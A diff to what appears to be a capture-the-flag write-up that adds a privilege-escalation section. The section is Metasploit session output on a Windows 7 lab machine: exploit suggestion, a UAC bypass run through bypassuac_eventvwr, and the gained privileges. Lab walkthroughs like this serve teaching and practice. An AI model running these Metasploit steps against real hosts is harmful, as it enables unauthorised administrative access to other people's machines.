@@ -102,11 +102,67 @@ rhosts
 
 ```
 
+### Escalating Privileges
 
+Proceding with the previous meterpreter, let's escalate privileges.
 
-### Step 3
+```
+meterpreter > sysinfo
+Computer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > run post/multi/recon/local_exploit_suggester
 
-[Description of third step goes here]
+[*] 10.10.58.222 - Collecting local exploits for x86/windows...
+[*] 10.10.58.222 - 34 exploit checks are being tried...
+[+] 10.10.58.222 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.58.222 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[+] 10.10.58.222 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.58.222 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.58.222 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.58.222 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.58.222 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.58.222 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.58.222 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable
+
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeChangeNotifyPrivilege
+SeIncreaseWorkingSetPrivilege
+SeShutdownPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+meterpreter > background
+[*] Backgrounding session 1...
+
+msf5 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
+msf5 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
+msf5 exploit(windows/local/bypassuac_eventvwr) > run
+
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+...
+SeTakeOwnershipPrivilege
+...
+meterpreter >
+
+```
 
 ## Flag
 
